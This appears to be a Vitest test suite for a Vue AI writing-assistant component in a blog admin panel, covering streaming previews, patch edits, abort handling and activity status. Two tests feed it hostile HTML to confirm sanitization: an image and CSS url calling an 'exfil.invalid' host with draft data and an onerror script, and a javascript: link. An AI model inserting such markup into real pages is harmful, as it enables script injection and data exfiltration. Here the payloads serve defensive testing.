import { flushPromises, mount } from '@vue/test-utils'
import { beforeEach, expect, it, vi } from 'vitest'
import AdminWritingAssistant from '@/components/AdminWritingAssistant.vue'

const stream = vi.hoisted(() => vi.fn())
vi.mock('@/services/adminAgent', () => ({ AdminAgentService: { stream } }))
beforeEach(() => { stream.mockReset() })

it('页面流式过程只展示预览，完整成功后点击应用才一次回写', async () => {
  let handlers: any
  let finish!: () => void
  stream.mockImplementation(async (_request, callbacks) => {
    handlers = callbacks
    await new Promise<void>(resolve => { finish = resolve })
  })
  const draft = { postId: 1, title: '原始标题', content: '<p>原稿尾部</p>' }
  const wrapper = mount(AdminWritingAssistant, { props: { draft } })
  await wrapper.find('textarea').setValue('写一篇完整文章')
  await wrapper.find('.send-btn').trigger('click')
  handlers.onFieldUpdate({ title: '新标题', contentHtml: '<p>中间稿</p>' })
  handlers.onFieldUpdate({ contentHtml: '<p style="background-image:&#117;rl(https://exfil.invalid/style)">完整结果</p><img src="https://exfil.invalid/image?draft=secret" onerror="alert(1)">' })
  await flushPromises()
  expect(wrapper.emitted('fieldUpdate')).toBeUndefined()
  expect(wrapper.find('.writing-preview-body').html()).not.toContain('onerror')
  expect(wrapper.find('.writing-preview-body').find('img').exists()).toBe(false)
  expect(wrapper.find('.writing-preview-body').html()).not.toContain('exfil.invalid')
  expect(wrapper.find('.writing-preview button').attributes('disabled')).toBeDefined()
  handlers.onComplete({}); finish(); await flushPromises()
  await wrapper.find('.writing-preview button').trigger('click')
  expect(wrapper.emitted('fieldUpdate')).toHaveLength(1)
  expect(wrapper.emitted('fieldUpdate')?.[0]?.[0]).toMatchObject({ title: '新标题', contentHtml: expect.stringContaining('完整结果') })
  expect(wrapper.emitted('fieldUpdate')?.[0]?.[1]).toEqual(draft)
  wrapper.unmount()
})

it('预览链接没有活动href，只有用户点击才打开已净化的地址', async () => {
  stream.mockImplementation(async (_request, handlers) => {
    handlers.onFieldUpdate({ contentHtml: '<p><a href="https://reference.invalid/article">参考</a></p><a href="javascript:alert(1)">无效链接</a>' })
    handlers.onComplete({})
  })
  const open = vi.spyOn(window, 'open').mockImplementation(() => null)
  const wrapper = mount(AdminWritingAssistant, { props: { draft: { content: '<p>原稿</p>' } } })
  await wrapper.find('textarea').setValue('润色正文')
  await wrapper.find('.send-btn').trigger('click'); await flushPromises()
  const link = wrapper.find('.writing-preview-body a')
  expect(link.attributes('href')).toBeUndefined()
  expect(open).not.toHaveBeenCalled()
  await link.trigger('click')
  expect(open).toHaveBeenCalledWith('https://reference.invalid/article', '_blank', 'noopener,noreferrer')
  expect(wrapper.find('.writing-preview-body').html()).not.toContain('javascript:')
  wrapper.unmount()
})

it('媒体预览隐藏后仍明确提示本轮省略的原稿媒体数量', async () => {
  stream.mockImplementation(async (_request, handlers) => {
    handlers.onFieldUpdate({ contentHtml: '<p>润色稿省略媒体</p>' })
    handlers.onComplete({})
  })
  const wrapper = mount(AdminWritingAssistant, { props: { draft: {
    content: '<p>原稿</p><audio src="/uploads/a.mp3"></audio><img src="/uploads/a.png">'
  } } })
  await wrapper.find('textarea').setValue('润色正文')
  await wrapper.find('.send-btn').trigger('click'); await flushPromises()
  expect(wrapper.find('.writing-preview').text()).toContain('本轮将移除 2 处原稿媒体')
  wrapper.unmount()
})

it('停止生成和卸载把AbortSignal传给流客户端，部分结果不可应用', async () => {
  const signals: AbortSignal[] = []
  stream.mockImplementation(async (_request, handlers, signal) => {
    signals.push(signal)
    handlers.onFieldUpdate({ contentHtml: '<p>部分结果</p>' })
    await new Promise<void>((_resolve, reject) => signal.addEventListener('abort', () => reject(new DOMException('Aborted', 'AbortError'))))
  })
  const wrapper = mount(AdminWritingAssistant, { props: { draft: { content: '<p>原稿</p>' } } })
  await wrapper.find('textarea').setValue('润色正文')
  await wrapper.find('.send-btn').trigger('click')
  await wrapper.findAll('button').find(button => button.text() === '停止生成')!.trigger('click')
  await flushPromises()
  expect(signals[0]?.aborted).toBe(true)
  expect(wrapper.find('.writing-preview button').attributes('disabled')).toBeDefined()
  expect(wrapper.emitted('fieldUpdate')).toBeUndefined()
  await wrapper.find('textarea').setValue('润色正文')
  await wrapper.find('.send-btn').trigger('click')
  wrapper.unmount(); await flushPromises()
  expect(signals[1]?.aborted).toBe(true)
  expect(wrapper.emitted('fieldUpdate')).toBeUndefined()
})

it('局部修改只展示命中段落前后对照，采纳保留其余HTML字节', async () => {
  const prefix = `<P class='keep'>完全保留的段落</P>\n`
  const suffix = `<audio controls src='/uploads/audio.mp3'></audio><p>长文尾部</p>`
  stream.mockImplementation(async (_request, handlers) => {
    handlers.onStart({ model: 'DeepSeek-V3.2', mode: 'writing', baseRevision: 'revision', requestId: 'request' })
    handlers.onActivity({ activityId: 'edit:1', stage: 'editing_content', status: 'running', message: '正在准备局部修改' })
    handlers.onFieldUpdate({ contentPatch: { baseRevision: 'revision', edits: [{ before: '<p>措字</p>', after: '<p>错字</p>' }] } })
    handlers.onActivity({ activityId: 'edit:1', stage: 'editing_content', status: 'completed', message: '局部修改已准备' })
    handlers.onComplete({})
  })
  const wrapper = mount(AdminWritingAssistant, { props: { draft: { content: prefix + '<p>措字</p>' + suffix } } })
  await wrapper.find('textarea').setValue('修复几个错字')
  await wrapper.find('.send-btn').trigger('click'); await flushPromises()
  expect(wrapper.find('.writing-patches').text()).toContain('局部修改 1 处')
  expect(wrapper.find('.patch-before').text()).toContain('措字')
  expect(wrapper.find('.patch-after').text()).toContain('错字')
  expect(wrapper.find('.writing-patches').text()).not.toContain('完全保留的段落')
  expect(wrapper.find('.writing-preview-body').exists()).toBe(false)
  await wrapper.find('.writing-preview button').trigger('click')
  expect(wrapper.emitted('fieldUpdate')?.[0]?.[0]).toMatchObject({ contentHtml: prefix + '<p>错字</p>' + suffix })
  expect(stream.mock.calls[0]?.[0].context.contentMode).toBe('patch')
  expect(stream.mock.calls[0]?.[0].context.requestedFields).toEqual(['content'])
  wrapper.unmount()
})

it('重复同工具活动按activityId同步，解释文字不冒充正文生成阶段', async () => {
  let handlers: any
  let finish!: () => void
  stream.mockImplementation(async (_request, callbacks) => { handlers = callbacks; await new Promise<void>(resolve => { finish = resolve }) })
  const wrapper = mount(AdminWritingAssistant, { props: { draft: { content: '<p>原稿</p>' } } })
  await wrapper.find('textarea').setValue('选分类标签'); await wrapper.find('.send-btn').trigger('click')
  handlers.onStart({ model: 'V3.2', mode: 'writing', baseRevision: 'r', requestId: 'id' })
  handlers.onData('我需要查看分类。')
  handlers.onActivity({ activityId: 'read:1', stage: 'reading_categories', toolName: 'listCategories', status: 'running', message: '正在读取第一组分类' })
  handlers.onActivity({ activityId: 'read:2', stage: 'reading_categories', toolName: 'listCategories', status: 'running', message: '正在读取第二组分类' })
  handlers.onActivity({ activityId: 'read:1', stage: 'reading_categories', toolName: 'listCategories', status: 'completed', message: '第一组分类已读取' })
  await flushPromises()
  expect(wrapper.find('.process-status').text()).toBe('正在读取第二组分类')
  expect(wrapper.findAll('.activity-item.running')).toHaveLength(1)
  expect(wrapper.text()).not.toContain('正在生成正文')
  handlers.onActivity({ activityId: 'read:2', stage: 'reading_categories', status: 'completed', message: '第二组分类已读取' })
  handlers.onComplete({}); finish(); await flushPromises(); wrapper.unmount()
})

it('工具-only成功连续写作保留最近14条短摘要，不会第8轮报历史超限', async () => {
  stream.mockImplementation(async (_request, handlers) => { handlers.onFieldUpdate({ title: '建议标题' }); handlers.onComplete({}) })
  const wrapper = mount(AdminWritingAssistant, { props: { draft: { title: '原标题', content: '<p>原稿</p>' } } })
  for (let index = 0; index < 10; index++) {
    await wrapper.find('textarea').setValue(`改标题第${index}轮`)
    await wrapper.find('.send-btn').trigger('click'); await flushPromises()
  }
  const last = stream.mock.calls[9]?.[0]
  expect(last.tempMessages).toHaveLength(14)
  expect(last.tempMessages[0].content).toBe('改标题第2轮')
  expect(last.tempMessages[13].content).toContain('建议修改标题')
  wrapper.unmount()
})

it('完整新稿采纳后默认局部修改，局部快捷操作覆盖残留的整篇模式', async () => {
  stream.mockImplementation(async (_request, handlers) => { handlers.onFieldUpdate({ contentHtml: '<p>完整新稿</p>' }); handlers.onComplete({}) })
  const wrapper = mount(AdminWritingAssistant, { props: { draft: { content: '' } } })
  expect((wrapper.find('select').element as HTMLSelectElement).value).toBe('replace')
  await wrapper.findAll('.quick-actions button').find(button => button.text() === '写完整文章')!.trigger('click')
  await flushPromises(); await wrapper.find('.writing-preview button').trigger('click')
  expect((wrapper.find('select').element as HTMLSelectElement).value).toBe('patch')
  await wrapper.setProps({ draft: { content: '<p>完整新稿</p>' } })
  await wrapper.find('select').setValue('replace')
  await wrapper.findAll('.quick-actions button').find(button => button.text() === '局部纠错')!.trigger('click'); await flushPromises()
  expect(stream.mock.calls[1]?.[0].context.contentMode).toBe('patch')
  wrapper.unmount()
})

it('停止旧轮后可立即新发请求，旧回调不能覆盖新建议或结束新loading', async () => {
  let oldHandlers: any
  let finishOld!: () => void
  stream.mockImplementationOnce(async (_request, handlers) => { oldHandlers = handlers; await new Promise<void>(resolve => { finishOld = resolve }) })
  stream.mockImplementationOnce(async (_request, handlers) => { handlers.onFieldUpdate({ title: '新轮建议' }); handlers.onComplete({}) })
  const wrapper = mount(AdminWritingAssistant, { props: { draft: { title: '原题', content: '<p>原稿</p>' } } })
  await wrapper.find('textarea').setValue('改标题第一轮'); await wrapper.find('.send-btn').trigger('click')
  await wrapper.findAll('button').find(button => button.text() === '停止生成')!.trigger('click')
  await wrapper.find('textarea').setValue('改标题第二轮'); await wrapper.find('.send-btn').trigger('click'); await flushPromises()
  oldHandlers.onFieldUpdate({ title: '迟到旧建议' }); oldHandlers.onComplete({}); finishOld(); await flushPromises()
  expect(wrapper.find('.writing-preview').text()).toContain('新轮建议')
  expect(wrapper.find('.writing-preview').text()).not.toContain('迟到旧建议')
  expect(wrapper.find('.writing-preview button').attributes('disabled')).toBeUndefined()
  wrapper.unmount()
})

it('实际分类创建事件来自父页，同ID完成后同步，清空隔离旧running', async () => {
  const wrapper = mount(AdminWritingAssistant, { props: { draft: { content: '<p>原稿</p>' }, localActivities: [] } })
  const activity = { activityId: 'local:taxonomy:1', stage: 'creating_category' as const, status: 'running' as const, message: '正在创建分类“Java”' }
  await wrapper.setProps({ localActivities: [activity] })
  expect(wrapper.find('.process-status').text()).toBe(activity.message)
  await wrapper.setProps({ localActivities: [{ ...activity, status: 'completed', message: '分类“Java”已创建' }] })
  expect(wrapper.find('.activity-item.success').text()).toContain('分类“Java”已创建')
  await wrapper.setProps({ localActivities: [{ ...activity, activityId: 'local:taxonomy:2' }] })
  await wrapper.setProps({ localActivities: [] })
  expect(wrapper.findAll('.activity-item.running')).toHaveLength(0)
  expect(wrapper.find('.activity-item.cancelled').text()).toContain('不再写入当前编辑器')
  wrapper.unmount()
})

it('上一轮分类创建失败留在历史中，不覆盖下一轮模型真实状态', async () => {
  let handlers: any
  let finish!: () => void
  stream.mockImplementation(async (_request, callbacks) => { handlers = callbacks; await new Promise<void>(resolve => { finish = resolve }) })
  const failure = { activityId: 'local:taxonomy:1', stage: 'creating_category' as const, status: 'failed' as const, message: '分类创建失败，请重试' }
  const wrapper = mount(AdminWritingAssistant, { props: { draft: { postId: 1, content: '<p>原稿</p>' }, localActivities: [failure] } })
  expect(wrapper.find('.process-status').text()).toBe(failure.message)
  await wrapper.find('textarea').setValue('检查正文'); await wrapper.find('.send-btn').trigger('click')
  handlers.onStart({ model: 'V3.2', mode: 'writing', baseRevision: 'r', requestId: 'id' })
  handlers.onActivity({ activityId: 'thinking:1', stage: 'thinking', status: 'running', message: 'AI 正在理解草稿并准备回复' })
  await flushPromises()
  expect(wrapper.find('.process-status').text()).toBe('AI 正在理解草稿并准备回复')
  expect(wrapper.find('.activity-item.failed').text()).toContain(failure.message)
  handlers.onActivity({ activityId: 'thinking:1', stage: 'thinking', status: 'completed', message: '本轮响应完成' })
  handlers.onComplete({}); finish(); await flushPromises()
  expect(wrapper.find('.process-status').text()).not.toContain('分类创建失败')
  wrapper.unmount()
})
